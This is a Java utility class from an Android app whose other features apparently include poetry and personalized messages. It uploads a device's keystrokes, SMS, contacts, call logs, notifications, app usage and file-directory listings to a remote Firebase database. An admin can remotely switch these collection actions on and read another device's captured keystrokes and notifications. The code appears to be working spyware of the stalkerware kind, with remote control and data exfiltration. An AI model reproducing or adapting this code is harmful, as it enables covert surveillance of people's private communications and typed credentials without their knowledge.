package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.getAndroidID;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.getDeviceDetails;
import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;
import static com.vikasyadavnsit.cdc.utils.SharedPreferenceUtils.isResetDone;

import android.app.Activity;
import android.content.Context;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.gson.Gson;
import com.vikasyadavnsit.cdc.constants.AppConstants;
import com.vikasyadavnsit.cdc.data.AppUsageData;
import com.vikasyadavnsit.cdc.data.AppUsageReportData;
import com.vikasyadavnsit.cdc.data.ApplicationData;
import com.vikasyadavnsit.cdc.data.KeyStrokeData;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.enums.ActionStatus;
import com.vikasyadavnsit.cdc.enums.ClickActions;

import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public class FirebaseUtils {

    private static Activity context;

    public static void initialize(Activity context) {
        FirebaseUtils.context = context;
    }

    // Get a reference to the database
    public static FirebaseDatabase getDatabase() {
        FirebaseDatabase database = FirebaseDatabase.getInstance(AppConstants.FIREBASE_DATABASE_REGION_URL);
        // database.setPersistenceEnabled(true);
        return database;
    }

    public static DatabaseReference getDbRef(String path) {
        DatabaseReference reference = getDatabase().getReference(path);
        reference.keepSynced(true);
        //reference.onDisconnect().setValue("I disconnected!");
        return reference;
    }

    private static String getPath(String path) {
        return getBasePath(context) + path;
    }

    private static String getBasePath(Context context) {
        return AppConstants.FIREBASE_RTDB_BASE_PATH + getAndroidID(context);
    }

    public static void deleteUserAndDeviceData() {
        DatabaseReference deleteRef = getDbRef(getBasePath(context));
        deleteRef.removeValue().addOnSuccessListener(aVoid -> {
            // Successfully deleted
            LoggerUtils.d("Firebase", "Data deleted successfully.");
        }).addOnFailureListener(databaseError -> {
            // Failed to delete
            LoggerUtils.e("Firebase", "Error deleting data: " + databaseError.getMessage());
        });
    }

    public static void getAppTriggerSettingsData() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/appSettings/appTriggerSettingsDataMap"));
        appTriggerSettingDataRef.addValueEventListener(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (!dataSnapshot.exists()) {
                    if (!isResetDone(context)) {
                        // User does not exist, create a new user
                        appTriggerSettingDataRef.setValue(createAppTriggerSettingsDataMap());
                    } else {
                        // Unsubscribe from updates if reset is done
                        appTriggerSettingDataRef.removeEventListener(this);
                    }
                } else {
                    ActionUtils.performFirebaseAction(dataSnapshot.getValue(Object.class));
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getShayariData(String index) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_SHAYARI_PATH + index);
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                ActionUtils.performShayariAction(dataSnapshot.getValue(Object.class));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getFlatUserDetails() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_FLAT_USERDETAILS_BASE_PATH);
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.performFlatUserDetailsActions(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No flat users data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No Flat Users data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserClickActions() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/appSettings/appTriggerSettingsDataMap");
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.getAndUpdateAndroidUserClickActions(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No click actions data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No click actions data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserKeystrokes() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/userDeviceData/keystrokes");
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserKeystrokes(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No keystrokes data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No keystrokes data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserAccessibilityNotification() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/userDeviceData/notifications");
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displayAndroidUserAccessibilityNotification(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No notification data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No notification data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    public static void getAndroidUserSystemAppUsageStatistics() {
        updateApplicationTriggerSettings(
                User.AppTriggerSettingsData.builder()
                        .enabled(true)
                        .clickActions(ClickActions.GET_APP_USAGE_STATISTICS_REPORT).build(), true);
    }

    private static void getAndroidUserSystemAppUsageStatisticsPostPushingCurrentDataSet() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/userDeviceData/appUsageReport");
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                if (dataSnapshot.exists()) {
                    ActionUtils.displaySystemAppUsageStatisticsReportData(dataSnapshot.getValue(Object.class));
                } else {
                    CommonUtil.hideLoader();
                    Toast.makeText(context, "No app usage statistics data found", Toast.LENGTH_SHORT).show();
                    LoggerUtils.d("FirebaseUtils", "No app usage statistics  data found");
                }
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }


    public static void getMessageData() {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/personalizedMessage"));
        appTriggerSettingDataRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                ActionUtils.performMessageAction(dataSnapshot.getValue(Object.class));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });
    }

    private static Map<String, User.AppTriggerSettingsData> createAppTriggerSettingsDataMap() {
        Map<String, User.AppTriggerSettingsData> map = new HashMap<>();
        Arrays.stream(ClickActions.values()).forEach(clickAction -> {
            User.AppTriggerSettingsData obj = User.AppTriggerSettingsData.builder().enabled(false).repeatable(false).maxRepetitions(1).interval(0).actionStatus(ActionStatus.IDLE).clickActions(clickAction).uploadDataSnapshot(true).deleteLocalData(false).build();
            map.put(clickAction.name(), obj);
        });
        return map;
    }

    public static void checkAndCreateUser(String userName) {
        DatabaseReference userRef = getDbRef(getBasePath(context));
        userRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                // User exists, update the user data , if not create a new user
                userRef.setValue(getUserData(userName));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });

        //Parallel Updating the duplicate data in flat user details for admin operations
        DatabaseReference flatUserDetailsRef = getDbRef(AppConstants.FIREBASE_RTDB_FLAT_USERDETAILS_BASE_PATH + getAndroidID(context));
        flatUserDetailsRef.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                // User exists, update the user data , if not create a new user
                flatUserDetailsRef.setValue(getUserData(userName));
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                // Failed to read value
                LoggerUtils.e("FirebaseUtils", "Failed to read value." + databaseError.toException());
            }
        });

    }

    private static User getUserData(String userName) {
        return User.builder().id(UUID.randomUUID().toString()).fullName(userName).deviceDetails(getDeviceDetails(context)).build();
    }

    public static void uploadUserKeystrokeDataSnapshot(KeyStrokeData keyStrokeData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/keystrokes"));
        appTriggerSettingDataRef.push().setValue(keyStrokeData);
    }

    public static void uploadUserSmsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/sms"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserContactsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/contacts"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserCallLogsDataSnapshot(List<Map<String, String>> messages) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/callLogs"));
        for (Map<String, String> message : messages) {
            appTriggerSettingDataRef.child(message.get(AppConstants.CURSOR_UNIQUE_ID_KEY_STRING)).setValue(message);
        }
    }

    public static void uploadUserNotificationDataSnapshot(NotificationData notificationData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/notifications"));
        appTriggerSettingDataRef.push().setValue(notificationData);
    }

    public static void uploadApplicationUsageDataSnapshot(AppUsageData appUsageData) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/appUsage"));
        appTriggerSettingDataRef.push().setValue(appUsageData);
    }

    public static void uploadApplicationUsageReportDataSnapshot(Map<String, AppUsageReportData> appUsageDataMap) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/appUsageReport/" + CommonUtil.getCurrentDate()));
        appTriggerSettingDataRef.setValue(appUsageDataMap);
    }

    public static void uploadDeviceDirectoryStructureSnapshot(LinkedHashMap<String, Object> directoryMap) {
        DatabaseReference appTriggerSettingDataRef = getDbRef(getPath("/userDeviceData/deviceDirectoryStructure/" + CommonUtil.getCurrentDate()));
        appTriggerSettingDataRef.push().setValue(directoryMap);
    }

    public static void updateApplicationTriggerSettings(User.AppTriggerSettingsData appTriggerSettingsData, boolean getDataPostPushingCurrentDataSet) {
        if (hasFileAccess()) {
            ApplicationData appData = ApplicationDataRepository.getRecordByKey(appTriggerSettingsData.getClickActions().name());
            User.AppTriggerSettingsData dbAppTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);
            dbAppTriggerSettingsData.setEnabled(appTriggerSettingsData.isEnabled());
            appTriggerSettingsData = dbAppTriggerSettingsData;
        }
        DatabaseReference appTriggerSettingDataRef = getDbRef(AppConstants.FIREBASE_RTDB_BASE_PATH
                + SharedPreferenceUtils.getAdminSettingsUserAndroidId(context) + "/appSettings/appTriggerSettingsDataMap/" + appTriggerSettingsData.getClickActions().name());
        User.AppTriggerSettingsData finalAppTriggerSettingsData = appTriggerSettingsData;
        appTriggerSettingDataRef.setValue(appTriggerSettingsData, new DatabaseReference.CompletionListener() {
            @Override
            public void onComplete(DatabaseError databaseError, DatabaseReference databaseReference) {
                if (databaseError != null) {
                    LoggerUtils.e("FirebaseUtils", "Error updating app trigger settings data: " + databaseError.getMessage());
                } else if (getDataPostPushingCurrentDataSet) {
                    getAndroidUserSystemAppUsageStatisticsPostPushingCurrentDataSet();
                    updateApplicationTriggerSettings(finalAppTriggerSettingsData, false);
                }
            }
        });
    }

}
